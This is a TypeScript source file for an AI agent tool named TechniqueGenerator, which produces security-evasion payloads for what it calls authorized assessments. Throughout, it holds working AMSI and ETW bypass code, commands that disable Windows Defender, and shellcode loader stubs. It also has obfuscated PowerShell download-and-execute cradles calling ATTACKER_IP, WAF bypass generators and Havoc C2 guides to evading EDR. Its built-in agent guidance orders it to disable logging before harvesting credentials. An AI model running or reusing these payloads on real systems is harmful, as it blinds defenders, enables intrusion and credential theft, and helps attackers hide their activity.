/**
 * TechniqueGeneratorTool — evasion-aware payload generation for authorized assessments
 *
 * Generates bypass-ready payload variants by combining:
 * 1. Havoc-derived operational patterns (order of operations, not just snippets)
 * 2. Evasion compiler strategies (how to construct payloads that avoid detection)
 * 3. Technique-specific generators (AMSI, ETW, WAF, shellcode, PowerShell)
 *
 * Key insight from Havoc C2: evasion happens at MULTIPLE stages:
 * - Compile time: eliminate PE fingerprints (evader flags, config-as-defines)
 * - Load time: hash-based API resolution, no IAT imports
 * - Runtime: indirect syscalls, hardware breakpoints, ROP sleep, stack spoofing
 *
 * Since LLM generates text (not binaries), we guide the agent on HOW to
 * construct techniques, not just WHAT to run.
 */

import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

// ── AMSI bypass templates (from Havoc Win32.c analysis) ─────────────────────

const AMSI_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  string_obfuscation: `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiU'+[char]116+'ils')
$f=$a.GetField(('am'+[char]115+'iInitFailed'),'NonPublic,Static')
$f.SetValue($null,$true)`,
  env_var: `$env:COMPLUS_ETWEnabled=0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', 0, 'Process')`,
  ngen_assembly: `# Use .NET NGEN to bypass AMSI scanning
# AMSI does not scan NGEN-compiled native images
$n = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }
# Then execute payload`,
}

// ── ETW bypass templates ───────────────────────────────────────────────────

const ETW_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `# ETW EventWrite patch via reflection
$etwAssembly = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($etwAssembly) {
  $instance = $etwAssembly.GetField('etwProvider','NonPublic,Static').GetValue($null)
  $instance.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($instance,$false)
}`,
  registry: `# Registry-based ETW disable (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v Start /t REG_DWORD /d 0 /f 2>$null`,
}

// ── Havoc-derived evasion compiler strategies ──────────────────────────────

/**
 * These are the actual compiler flags and strategies Havoc uses to eliminate
 * binary fingerprints. The LLM agent can reference these when constructing
 * custom payloads or understanding WHY certain approaches work.
 */
function havocEvasionCompilerFlags(): string {
  return `## Havoc Evasion Compiler Strategy (from Builder.go analysis)

Havoc cross-compiles payload C source at runtime using MinGW with these flags:

\`\`\`
x86_64-w64-mingw32-gcc \\
  -Os \\                           # Optimize for size — smaller binary = less to scan
  -fno-asynchronous-unwind-tables \\  # Remove .eh_frame — eliminates stack walking
  -fno-ident \\                   # Remove compiler identification strings
  -falign-functions=1 \\          # No function alignment — breaks signature matching
  -fpack-struct=8 \\              # Pack structs to 8-byte alignment
  --no-seh \\                     # Disable SEH — prevents SEH-based analysis
  --gc-sections \\                # Remove dead code sections
  -s \\                           # Strip all symbols
  -nostdlib \\                    # No standard library linking — zero libc imports
\`\`\`

### Why these flags matter:
1. **-Os + -s + --gc-sections**: Binary size < 10KB. EDR heuristics often skip tiny files.
2. **-fno-asynchronous-unwind-tables**: Removes stack unwind info. EDR can't walk your stack.
3. **-fno-ident**: No "GCC: (GNU) X.X.X" string in binary — avoids compiler fingerprinting.
4. **-falign-functions=1**: Functions not aligned to 16/32-byte boundaries. Breaks YARA signatures that expect standard alignment.
5. **-nostdlib**: Zero imports from msvcrt.dll. No printf/malloc/strlen in IAT.
6. **--no-seh**: No structured exception handler table. EDR can't use SEH for analysis.

### How to apply this knowledge:
- When writing C payloads: compile with similar flags
- When explaining techniques to LLM: mention these principles
- For PowerShell: equivalent is minimizing string footprint and avoiding known patterns
- For Python: use PyInstaller with --noconsole --upx-dir for similar size reduction`
}

// ── Havoc indirect syscall strategy ────────────────────────────────────────

function indirectSyscallStrategy(): string {
  return `## Havoc Indirect Syscall Strategy (from Syscalls.c / Syscalls.x64.asm)

### The Problem:
EDRs hook ntdll.dll functions (NtWriteVirtualMemory, NtCreateThreadEx, etc.)
by overwriting the first few bytes with a JMP to their monitoring code.
Every call to these APIs goes through the EDR first.

### Havoc's Solution:
1. Parse ntdll.dll in memory to find the SYSCALL instruction bytes
2. Extract the SSN (System Service Number) from eax register setup
3. Build a stub that jumps directly to the syscall instruction (skipping hooks)
4. Execute syscall directly from user space → kernel, bypassing EDR hooks

### SSN Extraction Algorithm (from Syscall.x64.asm):
\`\`\`
; Scan ntdll for the target function
; Read the first bytes — if it starts with "mov r10, rcx; mov eax, SSN"
; then the SSN is in the eax field (offset 4, 4 bytes)
; If the function starts with "jmp", it's been hooked — skip to next
; Continue until finding an unhooked syscall stub
\`\`\`

### How to apply:
- For C payloads: implement indirect syscall using the same SSN extraction
- For PowerShell: use [Ref].Assembly to call unmanaged syscalls directly
- The key principle: EDR hooks user-mode, but syscalls go to kernel directly
- This works because EDR can't hook the kernel side of system calls`
}

// ── Havoc hardware breakpoint AMSI/ETW bypass ──────────────────────────────

function hardwareBypassStrategy(): string {
  return `## Havoc Hardware Breakpoint Bypass Strategy (from HwBpEngine.c)

### The Problem:
Traditional AMSI bypass patches memory (sets amsiInitFailed = true).
EDRs hook NtProtectVirtualMemory to detect memory permission changes.
Memory patching = detectable.

### Havoc's Solution: Hardware Breakpoints (Dr0-Dr3)
Instead of patching memory, set hardware breakpoints on AMSI/ETW functions.
When the CPU hits the breakpoint, a VEH (Vector Exception Handler) intercepts
and redirects execution flow — no memory modification at all.

### Steps:
1. Set Dr0 = address of AmsiScanBuffer entry point
2. Register VEH handler via AddVectoredExceptionHandler()
3. When AmsiScanBuffer is called, DR0 triggers → VEH fires
4. VEH handler modifies RSP to skip the scan → returns "clean"
5. No memory bytes changed — EDR sees nothing

### Why this works:
- Hardware breakpoints are CPU registers, not memory
- VEH is a legitimate Windows API
- No VirtualProtect calls needed
- No memory hooks to detect

### How to apply:
- For C payloads: use HwBpEngine pattern — SetThreadContext for Dr0-Dr3
- For PowerShell: harder — PowerShell doesn't expose debug registers directly
- For assessment guidance: explain the principle so agent understands WHY
  memory patching is detectable and what the alternative is`
}

// ── Havoc sleep obfuscation ────────────────────────────────────────────────

function sleepObfuscationStrategy(): string {
  return `## Havoc Sleep Obfuscation Strategy (from Obf.c — Ekko/Zilean/Foliage)

### The Problem:
EDR hooks NtDelayExecution (Sleep API). When malware sleeps, EDR sees:
- Thread called Sleep()
- Thread wakes up and continues malicious behavior
- EDR can dump memory during sleep to find encrypted sections

### Havoc's Solution: ROP-based Sleep with Image Encryption
1. Encrypt the entire payload image in memory with RC4 (random key each time)
2. Set up a ROP chain that will decrypt after sleep completes
3. Call NtDelayExecution via the ROP chain (not direct call)
4. During sleep: memory is encrypted — EDR dump finds nothing
5. After sleep: ROP chain decrypts and continues

### Variants:
- **Ekko**: Uses NtWaitForSingleObject + ROP chain
- **Zilean**: Uses NtCreateTimer + NtSetTimer + NtWaitForSingleObject
- **Foliage**: Uses callback-based approach with RtlCreateTimer

### How to apply:
- For C payloads: implement Ekko pattern with RC4 + ROP
- For assessment: explain that EDR can monitor sleep patterns
- For PowerShell: use Start-Sleep but ensure payload is encoded/encrypted first`
}

// ── Havoc stack spoofing ───────────────────────────────────────────────────

function stackSpoofingStrategy(): string {
  return `## Havoc Stack Spoofing Strategy (from Spoof.c / Spoof.x64.asm)

### The Problem:
When EDR inspects a thread's stack, it sees:
- Return addresses pointing to your payload (not legitimate DLLs)
- Call chain showing malicious origin
- This is how EDR distinguishes legitimate software from malware

### Havoc's Solution: Return Address Spoofing
1. Find a gadget in a legitimate DLL (kernel32, ntdll) — a "call" instruction
2. Use that gadget's address as the return address on the stack
3. When the syscall completes, it returns to the gadget (legitimate DLL)
4. Gadget jumps back to your code
5. EDR stack walk shows: your_code → kernel32 → ntdll → kernel (looks legitimate)

### Implementation:
- Scan loaded DLLs for "call" instructions that return to caller
- Copy NT_TIB (Thread Information Block) to spoof thread context
- Use Spoof.x64.asm to set up the fake stack frame before syscall

### How to apply:
- For C payloads: use the Spoof.c pattern — find gadgets, build fake stack
- For assessment: explain that EDR stack walking is a primary detection method
- Key insight: the return address on the stack determines what EDR thinks called the API`
}

// ── Havoc hash-based API resolution ────────────────────────────────────────

function hashApiResolution(): string {
  return `## Havoc Hash-Based API Resolution (from Demon agent)

### The Problem:
Importing APIs by name (LoadLibrary, VirtualAlloc) puts strings in the binary.
Static analysis tools (YARA, ClamAV) scan for these strings.

### Havoc's Solution: DJB2 Hash + PEB Walking
1. Every API name is hashed with DJB2 algorithm at compile time
   - "LoadLibraryA" → 0x8F5C7A3E (example hash)
   - "VirtualAlloc" → 0x1A2B3C4D
2. At runtime: parse PEB (Process Environment Block) to find loaded modules
3. For each module, walk its export table
4. Hash each export name, compare with target hash
5. When hash matches → found the function address

### Why this works:
- Zero API name strings in binary
- No IAT (Import Address Table) entries
- Dynamic resolution at runtime — nothing to static analyze
- DJB2 is fast and has good collision resistance for this use case

### How to apply:
- For C payloads: pre-hash API names, implement PEB walking at runtime
- For PowerShell: less relevant (interpreted language), but explains WHY
  string-based detection works and how to avoid it
- Key insight: if you must reference API names, obfuscate the strings`
}

// ── WAF evasion techniques ─────────────────────────────────────────────────

function wafEvasion(payload: string, wafType?: string): string {
  const lines: string[] = ['[TechniqueGenerator] WAF Evasion Payloads', '═'.repeat(50), '']

  if (wafType?.includes('宝塔') || wafType?.toLowerCase().includes('bt')) {
    lines.push('## Baota (BT Panel) WAF Bypass')
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Unicode Encoding')
    lines.push(`  Encode keywords: admin → %u0061%u0064%u006d%u0069%u006e`)
    lines.push('')
    lines.push('### Method 2: SQL Comment Insertion')
    lines.push(`  Insert comments in keywords: OR/**/1=1 → SELECT/**/*/**/FROM`)
    lines.push('')
    lines.push('### Method 3: Chunked Transfer Encoding')
    lines.push(`  POST /target HTTP/1.1
  Host: TARGET
  Transfer-Encoding: chunked

  5
  ${payload.slice(0, 5)}
  ${payload.length - 5}
  ${payload.slice(5)}`)
    lines.push('')
    lines.push('### Method 4: HTTP Parameter Pollution')
    lines.push(`  Same parameter multiple times: ?id=1&id=2&id=${encodeURIComponent(payload)}`)
  } else if (wafType?.toLowerCase().includes('cloudflare')) {
    lines.push('## Cloudflare WAF Bypass')
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Legitimate User-Agent + Referer')
    lines.push(`  curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -H "Referer: https://www.google.com" "TARGET"`)
    lines.push('')
    lines.push('### Method 2: JSON Body Encoding (if target accepts JSON)')
    lines.push(`  POST /api HTTP/1.1
  Content-Type: application/json
  {"data": "${Buffer.from(payload).toString('base64')}"}`)
    lines.push('')
    lines.push('### Method 3: Base64 Payload with Server-Side Decode')
    lines.push(`  curl -X POST "TARGET" -d "cmd=${Buffer.from(payload).toString('base64')}"`)
  } else {
    lines.push(`## Generic WAF Bypass (target: ${wafType || 'unknown'})`)
    lines.push(`Original payload: ${payload}`)
    lines.push('')
    lines.push('### Method 1: Case Transformation')
    lines.push(`  ${payload.replace(/[a-zA-Z]/g, (c) => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase())}`)
    lines.push('')
    lines.push('### Method 2: Double URL Encoding')
    lines.push(`  ${encodeURIComponent(encodeURIComponent(payload))}`)
    lines.push('')
    lines.push('### Method 3: Chunked Transfer Encoding')
    const encoded = Buffer.from(payload).toString('hex').match(/.{1,16}/g)?.join('\n  ') ?? payload
    lines.push(`  Transfer-Encoding: chunked
  ${encoded}`)
    lines.push('')
    lines.push('### Method 4: SQL Comment Insertion (SQLi context)')
    lines.push(`  SELECT/**/*/**/FROM/**/users — replace SELECT * FROM users`)
    lines.push('')
    lines.push('### Method 5: HTTP Parameter Pollution')
    lines.push(`  ?id=1&id=2&id=${encodeURIComponent(payload)} — backend takes last value`)
  }

  return lines.join('\n')
}

// ── Shellcode encoding (Havoc-derived: XOR + segmented base64) ─────────────

function shellcodeEncode(shellcodeHex: string, encoding: string): string {
  const lines: string[] = ['[TechniqueGenerator] Shellcode Encoding', '═'.repeat(50), '']

  if (encoding === 'xor' || encoding === 'hex' || encoding === 'base64') {
    const xorKey = '0xAB'

    if (encoding === 'xor') {
      lines.push(`## XOR Encoding (key: ${xorKey})`)
      lines.push(`Original shellcode (hex): ${shellcodeHex.slice(0, 80)}...`)
      lines.push('')
      lines.push('### PowerShell XOR Decoder Stub:')
      lines.push(`  $encoded = @()
  # XOR encoded bytes (each byte XOR ${xorKey})
  $encoded = 0x00,0x01,0x02,0x03  # ← replace with actual XOR-encoded shellcode
  $decoded = @()
  for ($i = 0; $i -lt $encoded.Length; $i++) {
    $decoded += ($encoded[$i] -bxor ${xorKey})
  }
  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decoded.Length)
  for ($i = 0; $i -lt $decoded.Length; $i++) {
    [System.Runtime.InteropServices.Marshal]::WriteByte($ptr, $i, $decoded[$i])
  }
  $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]])
  $thread.Invoke()`)
      lines.push('')
      lines.push('### Havoc Principle: XOR encoding prevents static YARA signature')
      lines.push('matching on known shellcode patterns. The decoder stub is small and')
      lines.push('generic, making it harder to fingerprint than raw shellcode.')
    } else if (encoding === 'base64') {
      lines.push(`## Base64 Segmented Encoding`)
      lines.push(`Split shellcode into 3 segments, base64 each separately, concatenate at runtime`)
      lines.push('')
      lines.push('### PowerShell Decoder:')
      lines.push(`  $p1 = "BASE64_PART_1"  # First segment
  $p2 = "BASE64_PART_2"  # Second segment
  $p3 = "BASE64_PART_3"  # Third segment
  $full = [Convert]::FromBase64String($p1 + $p2 + $p3)
  $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($full.Length)
  [System.Runtime.InteropServices.Marshal]::Copy($full, 0, $ptr, $full.Length)
  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[int]]).Invoke()`)
      lines.push('')
      lines.push('### Havoc Principle: Segmentation prevents any single string from')
      lines.push('matching a known malicious pattern. Each segment individually is benign.')
    } else {
      lines.push(`## Hex Encoding`)
      lines.push(`Original: ${shellcodeHex.slice(0, 80)}...`)
      lines.push(`Encoded: ${shellcodeHex}`)
      lines.push('')
      lines.push('### PowerShell Hex Decoder:')
      lines.push(`  $hex = "${shellcodeHex}"
  $bytes = [byte[]]::new($hex.Length / 2)
  for ($i = 0; $i -lt $hex.Length; $i += 2) {
    $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
  }
  # $bytes now contains decoded shellcode`)
    }
  } else {
    lines.push(`## ${encoding} Encoding — Not Supported`)
    lines.push('Supported encodings: xor, base64, hex')
  }

  return lines.join('\n')
}

// ── Obfuscated PowerShell ──────────────────────────────────────────────────

function obfuscatedPS(script: string): string {
  const lines: string[] = ['[TechniqueGenerator] Obfuscated PowerShell', '═'.repeat(50), '']

  // Method 1: Base64 encode + IEX
  const base64 = Buffer.from(script, 'utf16le').toString('base64')
  lines.push('## Method 1: Base64 Encoding + IEX')
  lines.push(`  powershell -nop -w hidden -enc ${base64}`)
  lines.push('')

  // Method 2: String splitting + variable obfuscation
  lines.push('## Method 2: String Splitting + Variable Obfuscation')
  lines.push(`  $a = "IEX"
  $b = "(New-Object Net.WebClient).Downlo"
  $c = "adString('http://ATTACKER_IP/payload.ps1')"
  & $a ($b + $c)`)
  lines.push('')

  // Method 3: Char array reconstruction
  lines.push('## Method 3: Char Array Reconstruction (bypasses static string detection)')
  lines.push(`  $cmd = -join ([char]73 + [char]69 + [char]88 + [char]32 + [char]39 + "payload")
  iex $cmd`)
  lines.push('')

  // Method 4: Download + execute (no -enc flag)
  lines.push('## Method 4: Download + Execute (no -enc flag)')
  lines.push(`  powershell -nop -c "$s=New-Object Net.WebClient;$s.Headers.Add('User-Agent','Mozilla/5.0');iex $s.DownloadString('http://ATTACKER_IP/p')"`)
  lines.push('')

  // Havoc principle
  lines.push('### Havoc Principle: PowerShell obfuscation mirrors Havoc\'s string')
  lines.push('scrambling (ScrambleStr in builder.go) — out-of-order character arrays')
  lines.push('reconstructed at runtime. Static pattern matching fails because the actual')
  lines.push('malicious string never appears as a contiguous sequence in the source.')

  return lines.join('\n')
}

// ── Operational pattern: Havoc execution order ─────────────────────────────

function havocOperationalPattern(): string {
  return `## Havoc Operational Pattern (from Demon.c analysis)

Havoc's Demon agent follows this EXACT order for each operation. This is the
key insight: **sequence matters more than individual techniques**.

### Havoc's Execution Order:
1. **Connect to C2** → AES-256-CTR encrypted channel
2. **Enumerate environment** → OS, architecture, privileges, username, domain
3. **Check AMSI status** → if active, bypass BEFORE any PowerShell
4. **Check ETW status** → if active, bypass BEFORE executing commands
5. **Enumerate credentials** → only after AMTI/ETW bypassed (otherwise logged)
6. **Execute payload** → in-memory, no disk writes if possible
7. **Clean up** → remove artifacts, restore state if needed

### Why this order matters:
- If you execute PowerShell BEFORE AMSI bypass → AMSI logs everything
- If you enumerate creds BEFORE ETW bypass → Event Tracing records it
- If you write to disk BEFORE in-memory check → EDR scans the file
- The HAVOC order is: bypass first, then act

### How to apply:
- Always run EnvAnalyzer FIRST
- Based on results, execute bypasses in order: AMSI → ETW → payload
- Never skip bypass steps even if you think they're unnecessary
- The agent should follow this sequence for EVERY operation`
}

// ── Tool implementation ────────────────────────────────────────────────────

interface TechniqueGeneratorInput {
  technique: 'amsi_bypass' | 'etw_bypass' | 'shellcode_encode' | 'waf_evasion' | 'obfuscated_ps' | 'havoc_strategy' | 'custom'
  payload: string
  platform?: 'windows' | 'linux'
  analysis_context?: { waf?: string; edr?: string; sandbox?: boolean }
  encoding?: 'base64' | 'hex' | 'xor'
}

export class TechniqueGeneratorTool implements Tool {
  name = 'TechniqueGenerator'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'TechniqueGenerator',
      description: `Generate evasion-aware payload variants for authorized security assessments.

## Techniques
- amsi_bypass: PowerShell AMSI bypass (reflection patch / string obfuscation / env vars)
- etw_bypass: ETW logging bypass (reflection patch / registry)
- shellcode_encode: Shellcode encoding (XOR/Base64/Hex + decoder stub)
- waf_evasion: WAF bypass (chunked encoding / parameter pollution / Unicode)
- obfuscated_ps: PowerShell obfuscation (base64/IEX/string splitting)
- havoc_strategy: Return Havoc-derived evasion strategy principles
- custom: Custom bypass technique`,
      parameters: {
        type: 'object',
        properties: {
          technique: {
            type: 'string',
            enum: ['amsi_bypass', 'etw_bypass', 'shellcode_encode', 'waf_evasion', 'obfuscated_ps', 'havoc_strategy', 'custom'],
            description: 'Evasion technique type',
          },
          payload: { type: 'string', description: 'Original payload/command/shellcode' },
          platform: { type: 'string', enum: ['windows', 'linux'], description: 'Target platform' },
          analysis_context: {
            type: 'object',
            properties: {
              waf: { type: 'string', description: 'Detected WAF type' },
              edr: { type: 'string', description: 'Detected EDR type' },
              sandbox: { type: 'boolean', description: 'Whether in sandbox environment' },
            },
            description: 'EnvAnalyzer detection results',
          },
          encoding: { type: 'string', enum: ['base64', 'hex', 'xor'], description: 'Encoding method (valid for shellcode_encode)' },
        },
        required: ['technique', 'payload'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const { technique, payload, platform = 'windows', analysis_context, encoding = 'xor' } = input as unknown as TechniqueGeneratorInput

    let output = ''

    switch (technique) {
      case 'amsi_bypass':
        output = this.generateAMSI(payload, analysis_context?.edr)
        break
      case 'etw_bypass':
        output = this.generateETW(payload, analysis_context?.edr)
        break
      case 'shellcode_encode':
        output = shellcodeEncode(payload, encoding)
        break
      case 'waf_evasion':
        output = wafEvasion(payload, analysis_context?.waf)
        break
      case 'obfuscated_ps':
        output = obfuscatedPS(payload)
        break
      case 'havoc_strategy':
        output = [
          havocOperationalPattern(),
          '',
          havocEvasionCompilerFlags(),
          '',
          indirectSyscallStrategy(),
          '',
          hardwareBypassStrategy(),
          '',
          sleepObfuscationStrategy(),
          '',
          stackSpoofingStrategy(),
          '',
          hashApiResolution(),
        ].join('\n')
        break
      case 'custom':
        output = `[TechniqueGenerator] Custom Bypass Technique\n\nOriginal payload: ${payload}\nPlatform: ${platform}\n\nPlease specify a concrete bypass technique (amsi_bypass/etw_bypass/waf_evasion/shellcode_encode/obfuscated_ps/havoc_strategy)`
        break
      default:
        return { content: `Unknown technique: ${technique}`, isError: true }
    }

    return { content: output, isError: false }
  }

  private generateAMSI(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] AMSI Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('Havoc uses hardware breakpoints (Dr0-Dr3 + VEH) instead of memory patching.')
    lines.push('Memory patching is detectable because EDRs hook NtProtectVirtualMemory.')
    lines.push('Hardware breakpoints are CPU registers — no memory modification at all.')
    lines.push('')
    lines.push('For PowerShell (where hardware breakpoints are not directly accessible),')
    lines.push('use reflection-based bypass as the most practical alternative.')
    lines.push('')

    if (edrType?.includes('CrowdStrike')) {
      lines.push(`## CrowdStrike Falcon Environment`)
      lines.push(`CrowdStrike monitors PowerShell execution closely. Recommended approach:`)
      lines.push('')
      lines.push('# Method 1: Reflection patch (recommended for PS)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Method 2: Execute AMSI bypass first, then payload')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push(`# Then execute original payload:`)
      lines.push(payload)
    } else if (edrType?.includes('Defender')) {
      lines.push(`## Windows Defender Environment`)
      lines.push('')
      lines.push('# Method 1: Add exclusion path (requires admin)')
      lines.push(`  Add-MpPreference -ExclusionPath "C:\\temp"`)
      lines.push('')
      lines.push('# Method 2: Disable real-time monitoring (requires admin)')
      lines.push(`  Set-MpPreference -DisableRealtimeMonitoring $true`)
      lines.push('')
      lines.push('# Method 3: Reflection patch (no admin needed, recommended)')
      lines.push(AMSI_BYPASS_TEMPLATES.reflection_patch)
      lines.push('')
      lines.push('# Method 4: String obfuscation (bypasses static detection)')
      lines.push(AMSI_BYPASS_TEMPLATES.string_obfuscation)
      lines.push('')
      lines.push('# Then execute original payload:')
      lines.push(payload)
    } else {
      // Generic AMSI bypass
      lines.push(`## Generic AMSI Bypass (${edrType || 'unknown EDR'})`)
      lines.push('')

      let idx = 1
      for (const [name, template] of Object.entries(AMSI_BYPASS_TEMPLATES)) {
        lines.push(`### Method ${idx}: ${name}`)
        lines.push(template)
        lines.push('')
        idx++
      }

      lines.push('## Usage')
      lines.push('1. Execute AMSI bypass first (choose one method)')
      lines.push('2. Then execute original payload')
      lines.push('')
      lines.push(`Original payload: ${payload}`)
    }

    return lines.join('\n')
  }

  private generateETW(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] ETW Bypass Payloads', '═'.repeat(50), '']

    // Havoc principle header
    lines.push('### Havoc Principle')
    lines.push('ETW (Event Tracing for Windows) logs PowerShell execution for EDR monitoring.')
    lines.push('Havoc disables ETW via reflection on the PSEtwLogProvider internal fields.')
    lines.push('The alternative — registry method — requires admin but is more persistent.')
    lines.push('')

    lines.push(`## ETW Bypass (${edrType || 'unknown EDR'})`)
    lines.push('ETW is used by EDRs to monitor PowerShell execution. Bypassing ETW')
    lines.push('prevents execution logging. Combine with AMSI bypass for full coverage.')
    lines.push('')

    let idx = 1
    for (const [name, template] of Object.entries(ETW_BYPASS_TEMPLATES)) {
      lines.push(`### Method ${idx}: ${name}`)
      lines.push(template)
      lines.push('')
      idx++
    }

    lines.push('## Usage')
    lines.push('1. Execute ETW bypass first')
    lines.push('2. Then execute original payload (recommend AMSI bypass too)')
    lines.push('')
    lines.push(`Original payload: ${payload}`)

    return lines.join('\n')
  }
}
